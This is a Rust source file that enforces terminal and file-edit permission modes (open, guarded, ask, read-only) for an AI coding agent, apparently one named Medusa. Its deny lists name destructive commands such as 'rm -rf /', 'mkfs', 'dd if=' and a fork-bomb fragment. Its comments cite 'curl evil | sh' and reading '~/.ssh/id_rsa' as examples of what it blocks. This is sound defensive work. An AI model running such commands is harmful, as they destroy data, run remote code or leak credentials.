use std::{
    fs,
    path::{Path, PathBuf},
};

use color_eyre::eyre::{Result, WrapErr, bail};
use serde::{Deserialize, Serialize};

use crate::persistence::{atomic_write_private, ensure_private_dir};

#[derive(Debug, Clone)]
pub struct PermissionPolicy {
    config: PermissionConfig,
    /// Workspace root, used to downgrade auto-allowed reads that reference a
    /// path outside the workspace (an absolute/escaping `cat`/`ls`/… must
    /// prompt instead of silently reading arbitrary host files).
    workspace: PathBuf,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PermissionMode {
    Open,
    Guarded,
    Ask,
    Readonly,
}

impl PermissionMode {
    pub fn all() -> &'static [Self] {
        &[Self::Open, Self::Guarded, Self::Ask, Self::Readonly]
    }

    pub fn from_name(name: &str) -> Option<Self> {
        match name.trim().to_ascii_lowercase().as_str() {
            "open" | "auto" | "trusted" => Some(Self::Open),
            "guarded" | "safe" | "default" => Some(Self::Guarded),
            "ask" | "approve" | "approval" => Some(Self::Ask),
            "readonly" | "read-only" | "read_only" | "ro" => Some(Self::Readonly),
            _ => None,
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            Self::Open => "open",
            Self::Guarded => "guarded",
            Self::Ask => "ask",
            Self::Readonly => "readonly",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::Open => "Open",
            Self::Guarded => "Guarded",
            Self::Ask => "Ask",
            Self::Readonly => "Read-only",
        }
    }

    pub fn description(self) -> &'static str {
        match self {
            Self::Open => "Let workspace tools run with the normal Medusa workspace boundary.",
            Self::Guarded => {
                "Block destructive shell fragments and protected Medusa/Git paths by default."
            }
            Self::Ask => {
                "Pause mutating commands and file edits for approval; safe reads run freely."
            }
            Self::Readonly => "Allow common inspection commands and block file edits/patches.",
        }
    }

    /// Whether terminal commands run inside the macOS Seatbelt sandbox by
    /// default in this mode. Open is explicitly trusted (full access); every
    /// other mode confines writes and network unless overridden.
    pub fn sandboxes_by_default(self) -> bool {
        !matches!(self, Self::Open)
    }
}

/// Three-state permission outcome. `NeedsApproval` is produced in Ask mode
/// and when an otherwise auto-allowed read (Ask safe-reads, Readonly
/// allowlist) references a path outside the workspace; callers without an
/// approval channel must treat it as a denial.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PermissionCheck {
    Allow,
    Deny(String),
    NeedsApproval,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
struct PermissionConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    mode: Option<String>,
    #[serde(default)]
    terminal: TerminalPermissionConfig,
    #[serde(default)]
    patch: PatchPermissionConfig,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    sandbox: Option<SandboxSettings>,
}

impl PermissionConfig {
    fn ask(&self) -> bool {
        self.mode.as_deref() == Some("ask")
    }
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
struct TerminalPermissionConfig {
    #[serde(default)]
    allow_prefixes: Vec<String>,
    #[serde(default)]
    deny_contains: Vec<String>,
    #[serde(default)]
    read_only: bool,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
struct PatchPermissionConfig {
    #[serde(default)]
    allow_prefixes: Vec<String>,
    #[serde(default)]
    deny_prefixes: Vec<String>,
}

/// User-facing `sandbox` section of `.medusa/permissions.json`. `enabled`
/// overrides the mode default in either direction; `writable_roots` adds
/// extra writable subtrees (e.g. `~/.cargo/registry`); `allow_network`
/// permits outbound network inside the sandbox.
#[derive(Debug, Clone, Default, Deserialize, Serialize)]
pub struct SandboxSettings {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,
    #[serde(default)]
    pub writable_roots: Vec<String>,
    #[serde(default)]
    pub allow_network: bool,
}

impl PermissionPolicy {
    pub fn load(workspace: impl Into<PathBuf>) -> Result<Self> {
        let workspace = workspace.into();
        let path = workspace.join(".medusa").join("permissions.json");
        let config = if path.exists() {
            let text = fs::read_to_string(&path)
                .wrap_err_with(|| format!("failed to read {}", path.display()))?;
            serde_json::from_str(&text)
                .wrap_err_with(|| format!("failed to parse {}", path.display()))?
        } else {
            config_for_mode(PermissionMode::Guarded)
        };

        Ok(Self { config, workspace })
    }

    /// Apply a process-local mode override without rewriting the workspace
    /// permissions file. Explicit sandbox settings remain orthogonal to the
    /// selected mode, matching [`Self::write_mode`].
    pub fn with_mode_override(mut self, mode: PermissionMode) -> Self {
        let sandbox = self.config.sandbox.take();
        self.config = config_for_mode(mode);
        self.config.sandbox = sandbox;
        self
    }

    pub fn write_mode(workspace: impl AsRef<Path>, mode: PermissionMode) -> Result<()> {
        let workspace = workspace.as_ref();
        let path = workspace.join(".medusa").join("permissions.json");
        let mut config = config_for_mode(mode);

        let existing = path
            .exists()
            .then(|| fs::read_to_string(&path).ok())
            .flatten()
            .and_then(|text| serde_json::from_str::<PermissionConfig>(&text).ok());

        if let Some(existing) = existing {
            // The sandbox section is orthogonal to the mode; a mode switch
            // must never wipe user-configured writable roots or network.
            config.sandbox = existing.sandbox.clone();

            // Ask mode is the only mode where allow_prefixes is an additive
            // grant list; in Open/Guarded a non-empty allow_prefixes becomes
            // an exclusive allowlist, so carrying grants there would deny
            // everything else. Preserve accumulated grants only when writing
            // Ask mode AND the previous config was itself Ask — otherwise
            // Readonly's inspection allowlist (sed, find, …) would be
            // injected as silent Ask grants.
            if mode == PermissionMode::Ask && existing.ask() {
                for prefix in existing.terminal.allow_prefixes {
                    let prefix = prefix.trim().to_string();
                    if !prefix.is_empty()
                        && !config
                            .terminal
                            .allow_prefixes
                            .iter()
                            .any(|entry| entry.trim() == prefix)
                    {
                        config.terminal.allow_prefixes.push(prefix);
                    }
                }
            }
        }

        if let Some(parent) = path.parent() {
            ensure_private_dir(parent)
                .wrap_err_with(|| format!("failed to create {}", parent.display()))?;
        }

        let json =
            serde_json::to_string_pretty(&config).wrap_err("failed to encode permissions")?;
        atomic_write_private(&path, json)
            .wrap_err_with(|| format!("failed to write {}", path.display()))
    }

    pub fn check_terminal_command(&self, command: &str) -> Result<()> {
        match self.evaluate_terminal_command(command) {
            PermissionCheck::Allow => Ok(()),
            PermissionCheck::Deny(reason) => bail!("{reason}"),
            PermissionCheck::NeedsApproval => {
                bail!("terminal.exec requires approval in ask mode")
            }
        }
    }

    pub fn check_patch_paths(&self, paths: &[String]) -> Result<()> {
        match self.evaluate_patch_paths(paths) {
            PermissionCheck::Allow => Ok(()),
            PermissionCheck::Deny(reason) => bail!("{reason}"),
            PermissionCheck::NeedsApproval => {
                bail!("file mutation requires approval in ask mode")
            }
        }
    }

    /// The mode this config represents. Configs written by [`write_mode`]
    /// carry an explicit mode name; older or hand-written configs fall back
    /// to shape inference so sandbox defaults stay sensible for them.
    pub fn effective_mode(&self) -> PermissionMode {
        if let Some(mode) = self
            .config
            .mode
            .as_deref()
            .and_then(PermissionMode::from_name)
        {
            return mode;
        }
        if self.config.terminal.read_only {
            return PermissionMode::Readonly;
        }
        if !self.config.terminal.deny_contains.is_empty()
            || !self.config.patch.deny_prefixes.is_empty()
        {
            return PermissionMode::Guarded;
        }
        PermissionMode::Open
    }

    /// The user's `sandbox` config section (defaults when absent).
    pub fn sandbox_settings(&self) -> SandboxSettings {
        self.config.sandbox.clone().unwrap_or_default()
    }

    pub fn evaluate_terminal_command(&self, command: &str) -> PermissionCheck {
        let command = command.trim_start();

        if let Some(denied) = first_matching_contains(command, &self.config.terminal.deny_contains)
        {
            return PermissionCheck::Deny(format!(
                "terminal.exec denied by permissions: command contains `{denied}`"
            ));
        }

        let allow_prefixes = normalized_nonempty(&self.config.terminal.allow_prefixes);
        let allowlisted = allow_prefixes
            .iter()
            .any(|prefix| command_matches_allow_prefix(command, prefix));

        if self.config.ask() {
            // Safe read-only commands run without interrupting the user, and
            // explicit grants only count when the command has no shell
            // control tokens (blocks `cargo test && curl evil | sh`).
            if terminal_command_is_safe_readonly(command)
                || (allowlisted && !contains_shell_control_tokens(command))
            {
                return self.downgrade_if_reads_outside_workspace(command);
            }
            return PermissionCheck::NeedsApproval;
        }

        if !allow_prefixes.is_empty() && !allowlisted {
            return PermissionCheck::Deny(
                "terminal.exec denied by permissions: command does not match an allow_prefixes entry"
                    .to_string(),
            );
        }

        if self.config.terminal.read_only
            && let Err(error) = check_read_only_terminal_command(command)
        {
            return PermissionCheck::Deny(error.to_string());
        }

        // Readonly mode auto-allows its inspection allowlist (cat/head/ls/…).
        // A read of an absolute or escaping path is still an unapproved
        // out-of-tree read, so make it prompt rather than run silently.
        if self.config.terminal.read_only {
            return self.downgrade_if_reads_outside_workspace(command);
        }

        PermissionCheck::Allow
    }

    /// The auto-allow read lanes (Ask safe-reads, Readonly allowlist) must not
    /// silently read files outside the workspace. When a would-be-`Allow`
    /// command references an absolute/home/escaping path, downgrade it to
    /// `NeedsApproval` so a human approves the out-of-tree read. In-workspace
    /// relative reads (`cat Cargo.toml`, `ls src`) stay auto-allowed.
    ///
    /// Best-effort shell parsing only — see
    /// [`crate::tools::command_paths_outside_workspace`]; it does not see
    /// through command substitution or variable expansion.
    fn downgrade_if_reads_outside_workspace(&self, command: &str) -> PermissionCheck {
        // Shell expansion ($HOME, $(...), backticks) makes a path
        // statically unresolvable, so it can't be proven in-workspace —
        // `cat $HOME/.ssh/id_rsa` reads a host file the lexical scanner
        // sees as in-tree. Any control token forces a prompt.
        if contains_shell_control_tokens(command) {
            return PermissionCheck::NeedsApproval;
        }
        if crate::tools::command_paths_outside_workspace(command, &self.workspace).is_empty() {
            PermissionCheck::Allow
        } else {
            PermissionCheck::NeedsApproval
        }
    }

    pub fn evaluate_patch_paths(&self, paths: &[String]) -> PermissionCheck {
        let deny_prefixes = normalized_nonempty(&self.config.patch.deny_prefixes);
        let allow_prefixes = normalized_nonempty(&self.config.patch.allow_prefixes);
        // Match against a normalized form so `./​.git/x` can't slip past a
        // `.git/` deny prefix.
        let normalized = paths
            .iter()
            .map(|path| normalize_patch_match_path(path))
            .collect::<Vec<_>>();

        for (original, path) in paths.iter().zip(&normalized) {
            if let Some(denied) = first_matching_prefix(path, &deny_prefixes) {
                return PermissionCheck::Deny(format!(
                    "file.patch denied by permissions: `{original}` matches `{denied}`"
                ));
            }
        }

        if self.config.ask() {
            let all_allowlisted = !allow_prefixes.is_empty()
                && normalized.iter().all(|path| {
                    allow_prefixes
                        .iter()
                        .any(|prefix| path.starts_with(prefix.as_str()))
                });
            return if all_allowlisted {
                PermissionCheck::Allow
            } else {
                PermissionCheck::NeedsApproval
            };
        }

        for (original, path) in paths.iter().zip(&normalized) {
            if !allow_prefixes.is_empty()
                && !allow_prefixes
                    .iter()
                    .any(|prefix| path.starts_with(prefix.as_str()))
            {
                return PermissionCheck::Deny(format!(
                    "file.patch denied by permissions: `{original}` does not match an allow_prefixes entry"
                ));
            }
        }

        PermissionCheck::Allow
    }

    /// Persist a terminal allow-prefix grant ("always allow") for this
    /// workspace, deduplicating existing entries.
    pub fn append_terminal_allow_prefix(workspace: impl AsRef<Path>, prefix: &str) -> Result<()> {
        let prefix = prefix.trim();
        if prefix.is_empty() {
            bail!("cannot persist an empty allow prefix");
        }

        let path = workspace.as_ref().join(".medusa").join("permissions.json");
        let mut config = if path.exists() {
            let text = fs::read_to_string(&path)
                .wrap_err_with(|| format!("failed to read {}", path.display()))?;
            serde_json::from_str::<PermissionConfig>(&text)
                .wrap_err_with(|| format!("failed to parse {}", path.display()))?
        } else {
            PermissionConfig::default()
        };

        if !config
            .terminal
            .allow_prefixes
            .iter()
            .any(|existing| existing.trim() == prefix)
        {
            config.terminal.allow_prefixes.push(prefix.to_string());
        }

        if let Some(parent) = path.parent() {
            ensure_private_dir(parent)
                .wrap_err_with(|| format!("failed to create {}", parent.display()))?;
        }
        let json =
            serde_json::to_string_pretty(&config).wrap_err("failed to encode permissions")?;
        atomic_write_private(&path, json)
            .wrap_err_with(|| format!("failed to write {}", path.display()))
    }
}

fn config_for_mode(mode: PermissionMode) -> PermissionConfig {
    match mode {
        PermissionMode::Open => PermissionConfig {
            mode: Some("open".to_string()),
            ..PermissionConfig::default()
        },
        PermissionMode::Ask => PermissionConfig {
            mode: Some("ask".to_string()),
            terminal: TerminalPermissionConfig {
                allow_prefixes: Vec::new(),
                deny_contains: vec![
                    "rm -rf /".to_string(),
                    "mkfs".to_string(),
                    "dd if=".to_string(),
                    ":(){".to_string(),
                    "chmod -R 777".to_string(),
                    "chown -R".to_string(),
                ],
                read_only: false,
            },
            patch: PatchPermissionConfig {
                allow_prefixes: Vec::new(),
                deny_prefixes: vec![
                    ".git/".to_string(),
                    ".medusa/sessions/".to_string(),
                    ".medusa/permissions.json".to_string(),
                ],
            },
            sandbox: None,
        },
        PermissionMode::Guarded => PermissionConfig {
            mode: Some("guarded".to_string()),
            terminal: TerminalPermissionConfig {
                allow_prefixes: Vec::new(),
                deny_contains: vec![
                    "rm -rf".to_string(),
                    "mkfs".to_string(),
                    "dd if=".to_string(),
                    ":(){".to_string(),
                    "chmod -R 777".to_string(),
                    "chown -R".to_string(),
                ],
                read_only: false,
            },
            patch: PatchPermissionConfig {
                allow_prefixes: Vec::new(),
                deny_prefixes: vec![
                    ".git/".to_string(),
                    ".medusa/sessions/".to_string(),
                    ".medusa/permissions.json".to_string(),
                ],
            },
            sandbox: None,
        },
        PermissionMode::Readonly => PermissionConfig {
            mode: Some("readonly".to_string()),
            terminal: TerminalPermissionConfig {
                allow_prefixes: vec![
                    "pwd".to_string(),
                    "ls".to_string(),
                    "find".to_string(),
                    "rg".to_string(),
                    "grep".to_string(),
                    "cat".to_string(),
                    "sed".to_string(),
                    "head".to_string(),
                    "tail".to_string(),
                    "wc".to_string(),
                    "git status".to_string(),
                    "git diff".to_string(),
                    "git log".to_string(),
                ],
                deny_contains: Vec::new(),
                read_only: true,
            },
            patch: PatchPermissionConfig {
                allow_prefixes: vec!["__medusa_readonly_no_write_paths__".to_string()],
                deny_prefixes: Vec::new(),
            },
            sandbox: None,
        },
    }
}

fn normalized_nonempty(values: &[String]) -> Vec<String> {
    values
        .iter()
        .map(|value| value.trim())
        .filter(|value| !value.is_empty())
        .map(ToString::to_string)
        .collect()
}

fn first_matching_contains<'a>(text: &str, patterns: &'a [String]) -> Option<&'a str> {
    patterns
        .iter()
        .map(|pattern| pattern.trim())
        .filter(|pattern| !pattern.is_empty())
        .find(|pattern| text.contains(*pattern))
}

fn command_matches_allow_prefix(command: &str, prefix: &str) -> bool {
    let prefix = prefix.trim_end();
    if prefix.is_empty() {
        return false;
    }

    command == prefix
        || command
            .strip_prefix(prefix)
            .is_some_and(|rest| rest.starts_with(char::is_whitespace))
}

const SHELL_CONTROL_TOKENS: &[&str] = &[
    // Bare `$` (not just `$(`/`${`) so env-var expansion like `cat $HOME/.ssh/id_rsa`
    // is never treated as safe-readonly — the shell would expand it to a path we
    // cannot statically confine to the workspace, so it must prompt.
    "\n", "\r", ";", "&&", "||", "|", "&", ">", "<", "`", "$",
];

pub(crate) fn contains_shell_control_tokens(command: &str) -> bool {
    SHELL_CONTROL_TOKENS
        .iter()
        .any(|token| command.contains(token))
}

/// Programs that only inspect state; in Ask mode they run without prompting
/// as long as the command has no shell control tokens. Deliberately excludes
/// anything that can write files or execute a subprogram (env, awk, sed,
/// sort, tee, xargs, …); those degrade to a prompt, never to silent-allow.
const ASK_SAFE_PROGRAMS: &[&str] = &[
    "pwd", "ls", "cat", "head", "tail", "wc", "rg", "grep", "find", "file", "stat", "du", "tree",
    "which", "date", "whoami", "uname", "echo", "printf", "basename", "dirname", "realpath",
    "uniq", "cut", "column",
];

fn terminal_command_is_safe_readonly(command: &str) -> bool {
    if contains_shell_control_tokens(command) {
        return false;
    }

    let mut words = command.split_whitespace();
    let Some(program) = words.next() else {
        return false;
    };
    if program == "git" {
        // Only inspection subcommands are safe; `git branch -d`, `git config`,
        // etc. mutate, so anything else prompts.
        return matches!(
            words.next().unwrap_or_default(),
            "status" | "diff" | "log" | "show" | "blame" | "shortlog"
        );
    }
    if !ASK_SAFE_PROGRAMS.contains(&program) {
        return false;
    }

    // `find` with mutating actions is still guarded by the read-only checker.
    check_read_only_terminal_command(command).is_ok()
}

fn check_read_only_terminal_command(command: &str) -> Result<()> {
    const DENIED_SHELL_TOKENS: &[&str] = &[
        "\n", "\r", ";", "&&", "||", "|", "&", ">", "<", "`", "$(", "${",
    ];

    for token in DENIED_SHELL_TOKENS {
        if command.contains(token) {
            bail!(
                "terminal.exec denied by readonly permissions: command contains shell token `{token}`"
            );
        }
    }

    let mut words = command.split_whitespace();
    let program = words.next().unwrap_or_default();
    let args = words.collect::<Vec<_>>();

    match program {
        "sed" => {
            if args
                .iter()
                .any(|arg| *arg == "--in-place" || arg.starts_with("-i"))
            {
                bail!("terminal.exec denied by readonly permissions: sed in-place editing");
            }
        }
        "find" => {
            if let Some(arg) = args.iter().find(|arg| {
                matches!(
                    **arg,
                    "-delete"
                        | "-exec"
                        | "-execdir"
                        | "-ok"
                        | "-okdir"
                        | "-fprint"
                        | "-fprintf"
                        | "-fls"
                )
            }) {
                bail!("terminal.exec denied by readonly permissions: find action `{arg}`");
            }
        }
        _ => {}
    }

    Ok(())
}

/// Collapse leading `./` and internal `/./` so prefix matching cannot be
/// dodged with cosmetic path components.
fn normalize_patch_match_path(path: &str) -> String {
    let mut normalized = path.replace("/./", "/");
    while let Some(rest) = normalized.strip_prefix("./") {
        normalized = rest.to_string();
    }
    normalized
}

fn first_matching_prefix<'a>(text: &str, patterns: &'a [String]) -> Option<&'a str> {
    patterns
        .iter()
        .map(|pattern| pattern.trim())
        .filter(|pattern| !pattern.is_empty())
        .find(|pattern| text.starts_with(*pattern))
}

#[cfg(test)]
mod tests;
